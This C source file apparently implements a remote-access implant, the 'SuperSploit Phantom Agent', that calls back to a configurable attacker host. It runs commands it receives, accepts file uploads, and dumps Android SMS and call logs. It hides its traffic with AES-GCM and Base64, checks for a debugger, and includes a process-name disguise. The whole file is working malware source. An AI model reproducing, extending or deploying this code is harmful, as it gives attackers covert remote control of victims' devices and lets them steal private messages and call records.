#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/sysinfo.h>
#include <sys/utsname.h>
#include <fcntl.h>
#include <dirent.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <openssl/rand.h>

// --- CONFIGURATION (Swapped by Framework) ---
#ifndef LHOST
#define LHOST "127.0.0.1"
#endif

#ifndef LPORT
#define LPORT 5000
#endif

#ifndef XOR_KEY
#define XOR_KEY "SuperSploitKey"
#endif

// --- STRUCTURES ---
typedef struct {
    unsigned char* data;
    size_t len;
} blob_t;

// --- CRYPTOGRAPHY STATE ---
unsigned char aes_key[32];

void init_crypto() {
    SHA256((const unsigned char*)XOR_KEY, strlen(XOR_KEY), aes_key);
}

// --- STEALTH & EVASION ---
void mask_process(const char* name) {
    prctl(PR_SET_NAME, name, 0, 0, 0);
}

int check_env() {
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) return 0; // Debugger detected
    ptrace(PTRACE_DETACH, 0, 1, 0);
    return 1;
}

// --- PROTOCOL: XOR + Base64 ---
static const char b64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char* b64_encode(const unsigned char *data, size_t input_length, size_t *out_len) {
    *out_len = 4 * ((input_length + 2) / 3);
    char *encoded_data = malloc(*out_len + 1);
    if (!encoded_data) return NULL;

    for (size_t i = 0, j = 0; i < input_length;) {
        uint32_t a = i < input_length ? data[i++] : 0;
        uint32_t b = i < input_length ? data[i++] : 0;
        uint32_t c = i < input_length ? data[i++] : 0;
        uint32_t triple = (a << 16) + (b << 8) + c;
        encoded_data[j++] = b64_chars[(triple >> 18) & 0x3F];
        encoded_data[j++] = b64_chars[(triple >> 12) & 0x3F];
        encoded_data[j++] = b64_chars[(triple >> 6) & 0x3F];
        encoded_data[j++] = b64_chars[triple & 0x3F];
    }
    for (int i = 0; i < (3 - input_length % 3) % 3; i++)
        encoded_data[*out_len - 1 - i] = '=';
    encoded_data[*out_len] = '\0';
    return encoded_data;
}

unsigned char* b64_decode(const char *data, size_t input_length, size_t *out_len) {
    if (input_length % 4 != 0) return NULL;
    *out_len = input_length / 4 * 3;
    if (data[input_length - 1] == '=') (*out_len)--;
    if (data[input_length - 2] == '=') (*out_len)--;

    unsigned char *decoded_data = malloc(*out_len + 1);
    if (!decoded_data) return NULL;

    int table[256];
    for (int i = 0; i < 256; i++) table[i] = -1;
    for (int i = 0; i < 64; i++) table[(unsigned char)b64_chars[i]] = i;

    for (size_t i = 0, j = 0; i < input_length;) {
        uint32_t a = table[(unsigned char)data[i++]];
        uint32_t b = table[(unsigned char)data[i++]];
        uint32_t c = (data[i] == '=') ? (i++, 0) : table[(unsigned char)data[i++]];
        uint32_t d = (data[i] == '=') ? (i++, 0) : table[(unsigned char)data[i++]];
        uint32_t triple = (a << 18) + (b << 12) + (c << 6) + d;
        if (j < *out_len) decoded_data[j++] = (triple >> 16) & 0xFF;
        if (j < *out_len) decoded_data[j++] = (triple >> 8) & 0xFF;
        if (j < *out_len) decoded_data[j++] = triple & 0xFF;
    }
    decoded_data[*out_len] = '\0';
    return decoded_data;
}

unsigned char* aes_encrypt(const unsigned char *plaintext, int plaintext_len, int *out_len) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned char iv[12];
    RAND_bytes(iv, sizeof(iv));

    unsigned char *out = malloc(12 + plaintext_len + 16); // IV + Ciphertext + Tag
    memcpy(out, iv, 12);

    int len;
    int ciphertext_len;

    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, aes_key, iv);
    EVP_EncryptUpdate(ctx, out + 12, &len, plaintext, plaintext_len);
    ciphertext_len = len;
    
    EVP_EncryptFinal_ex(ctx, out + 12 + len, &len);
    ciphertext_len += len;

    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, out + 12 + ciphertext_len);
    *out_len = 12 + ciphertext_len + 16;

    EVP_CIPHER_CTX_free(ctx);
    return out;
}

unsigned char* aes_decrypt(const unsigned char *ciphertext_buf, int ciphertext_buf_len, int *out_len) {
    if (ciphertext_buf_len < 12 + 16) return NULL;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned char iv[12];
    unsigned char tag[16];
    memcpy(iv, ciphertext_buf, 12);
    memcpy(tag, ciphertext_buf + ciphertext_buf_len - 16, 16);

    int actual_ct_len = ciphertext_buf_len - 12 - 16;
    unsigned char *out = malloc(actual_ct_len + 1);

    int len;
    int plaintext_len;

    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, aes_key, iv);
    EVP_DecryptUpdate(ctx, out, &len, ciphertext_buf + 12, actual_ct_len);
    plaintext_len = len;

    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag);
    int ret = EVP_DecryptFinal_ex(ctx, out + len, &len);

    EVP_CIPHER_CTX_free(ctx);

    if (ret > 0) {
        plaintext_len += len;
        out[plaintext_len] = '\0';
        *out_len = plaintext_len;
        return out;
    } else {
        free(out);
        return NULL;
    }
}

void send_enc(int fd, const char* data) {
    size_t len = strlen(data);
    int enc_len = 0;
    unsigned char* crypted = aes_encrypt((const unsigned char*)data, len, &enc_len);
    if (!crypted) return;
    
    size_t b64_len = 0;
    char* b64 = b64_encode(crypted, enc_len, &b64_len);
    free(crypted);
    if (!b64) return;
    uint32_t net_len = htonl(b64_len);
    send(fd, &net_len, sizeof(net_len), 0);
    send(fd, b64, b64_len, 0);
    free(b64);
}

blob_t recv_enc(int fd) {
    blob_t res = {NULL, 0};
    uint32_t net_len;
    if (recv(fd, &net_len, sizeof(net_len), 0) <= 0) return res;
    size_t b64_len = ntohl(net_len);
    if (b64_len > 5000000) return res; 
    char* b64 = malloc(b64_len + 1);
    if (!b64) return res;
    size_t total = 0;
    while (total < b64_len) {
        ssize_t n = recv(fd, b64 + total, b64_len - total, 0);
        if (n <= 0) { free(b64); return res; }
        total += n;
    }
    b64[b64_len] = '\0';
    size_t dec_len = 0;
    unsigned char* dec = b64_decode(b64, b64_len, &dec_len);
    free(b64);
    if (!dec) return res;
    
    int plain_len = 0;
    unsigned char* plain = aes_decrypt(dec, dec_len, &plain_len);
    free(dec);
    
    res.data = plain;
    res.len = plain_len;
    return res;
}

// --- COMMAND EXECUTION ---
void shell_exec(int fd, const char* cmd) {
    char cmd_err[2048];
    snprintf(cmd_err, sizeof(cmd_err), "%s 2>&1", cmd);
    FILE* fp = popen(cmd_err, "r");
    if (!fp) { send_enc(fd, "[-] Exec failed\n"); return; }
    size_t total_size = 4096;
    char* output = malloc(total_size);
    size_t current_len = 0;
    char buf[1024];
    while (fgets(buf, sizeof(buf), fp)) {
        size_t len = strlen(buf);
        if (current_len + len + 1 > total_size) {
            total_size *= 2;
            output = realloc(output, total_size);
        }
        strcpy(output + current_len, buf);
        current_len += len;
    }
    pclose(fp);
    if (current_len == 0) send_enc(fd, " ");
    else send_enc(fd, output);
    free(output);
}

void handle_cmd(int fd, char* cmd) {
    if (strncmp(cmd, "upload ", 7) == 0) {
        char path[512];
        strncpy(path, cmd + 7, sizeof(path) - 1);
        send_enc(fd, "READY");
        blob_t file_blob = recv_enc(fd);
        if (!file_blob.data) return;
        FILE* f = fopen(path, "wb");
        if (f) {
            fwrite(file_blob.data, 1, file_blob.len, f);
            fclose(f);
            send_enc(fd, "[+] Upload successful\n");
        } else {
            send_enc(fd, "[-] Failed to open file for writing\n");
        }
        free(file_blob.data);
    } else if (strncmp(cmd, "dump_sms", 8) == 0) shell_exec(fd, "content query --uri content://sms");
    else if (strncmp(cmd, "dump_calls", 10) == 0) shell_exec(fd, "content query --uri content://call_log/calls");
    else if (strcmp(cmd, "pwd") == 0) {
        char cwd[512];
        if (getcwd(cwd, sizeof(cwd))) {
            strcat(cwd, "\n");
            send_enc(fd, cwd);
        }
    } else if (strcmp(cmd, "whoami") == 0) {
        char* user = getuid() == 0 ? "root\n" : "shell\n";
        send_enc(fd, user);
    } else if (strcmp(cmd, "id") == 0) {
        char id_str[256];
        snprintf(id_str, sizeof(id_str), "uid=%d gid=%d\n", getuid(), getgid());
        send_enc(fd, id_str);
    } else if (strcmp(cmd, "terminate") == 0) {
        send_enc(fd, "[*] Terminating agent...\n");
        close(fd);
        exit(0);
    } else if (strncmp(cmd, "ls", 2) == 0) {
        DIR *d; struct dirent *dir; d = opendir(".");
        if (d) {
            size_t out_cap = 8192;
            char* out = malloc(out_cap);
            out[0] = '\0';
            while ((dir = readdir(d)) != NULL) {
                if (strlen(out) + strlen(dir->d_name) + 2 > out_cap) {
                    out_cap *= 2;
                    out = realloc(out, out_cap);
                }
                strcat(out, dir->d_name);
                strcat(out, "\n");
            }
            send_enc(fd, out);
            free(out);
            closedir(d);
        }
    } else shell_exec(fd, cmd);
}

int main() {
    if (!check_env()) return 1;
    init_crypto();
    // mask_process("[kworker/u:1]");
    while(1) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(LPORT);
        inet_pton(AF_INET, LHOST, &addr.sin_addr);
        if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            send_enc(fd, "SuperSploit Phantom Agent Active\n");
            while(1) {
                blob_t cmd_blob = recv_enc(fd);
                if (!cmd_blob.data) break;
                char* cmd = malloc(cmd_blob.len + 1);
                memcpy(cmd, cmd_blob.data, cmd_blob.len);
                cmd[cmd_blob.len] = '\0';
                free(cmd_blob.data);
                handle_cmd(fd, cmd);
                free(cmd);
            }
        }
        close(fd);
        sleep(10);
    }
    return 0;
}
